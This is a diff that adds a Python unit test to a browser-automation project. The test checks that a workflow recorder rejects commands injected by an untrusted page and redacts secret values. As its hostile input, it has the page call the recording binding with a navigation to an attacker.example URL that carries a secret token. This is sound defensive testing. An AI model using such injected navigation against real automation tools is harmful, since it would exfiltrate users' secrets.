@@ -246,6 +246,41 @@ class SharedBrowserRealTests(unittest.TestCase):
                         "Cancelling workflow must not close manually opened browser")
         self.manager.stop(profile.id)
 
+    def test_recorder_rejects_page_injection_and_reviews_navigation_safely(self):
+        """Untrusted page binding cannot inject workflow commands or secret values."""
+        profile=self.store.save(Profile(name="recorded-review",browser="chromium",start_url=self.origin))
+        self.manager.start(profile.id)
+        self.assertTrue(eventually(lambda:(s:=self.manager._sessions.get(profile.id))
+                                  is not None and s.ready.is_set()))
+        self.manager.start_recording(profile.id)
+        async def demonstrate():
+            page=self.manager._sessions[profile.id].context.pages[0]
+            # A page itself can invoke exposed bindings. The recording
+            # boundary must never accept executable navigation from the page.
+            await page.evaluate("""() => window.__autumnRecord({
+                action:'goto',url:'https://attacker.example/token?value=PRIVATE_SECRET'})""")
+            await page.evaluate("""() => window.__autumnRecord({
+                action:'fill',selector:'#secret',text:'PRIVATE_SECRET'})""")
+            await page.evaluate("""() => window.__autumnRecord({
+                action:'select_option',selector:'#category',value:'PRIVATE_OPTION'})""")
+            await page.reload(wait_until="domcontentloaded")
+            await page.locator("#press").click()
+        self.manager._submit(demonstrate()).result(timeout=30)
+        self.assertTrue(eventually(lambda:len(self.manager.recorded_steps(profile.id))>=3))
+        steps=self.manager.recorded_steps(profile.id)
+        self.assertEqual([s["action"] for s in steps],["fill","select_option","click"])
+        self.assertEqual(steps[0]["text"],"")
+        self.assertEqual(steps[1]["value"],"REVIEW_OPTION")
+        self.assertNotIn("PRIVATE_SECRET",repr(steps))
+        self.assertNotIn("PRIVATE_OPTION",repr(steps))
+        review=self.manager.recording_review(profile.id)
+        self.assertTrue(review["requires_review"])
+        self.assertEqual(review["redacted_fields"],2)
+        self.assertGreaterEqual(review["navigation_boundaries"],1)
+        self.assertNotIn("https://",repr(review))
+        self.manager.stop_recording(profile.id)
+        self.manager.stop(profile.id)
+
     def test_user_closes_last_page_and_recorder_redacts_text(self):
         profile=self.store.save(Profile(name="recorder",browser="chromium",start_url=self.origin))
         self.manager.start(profile.id)
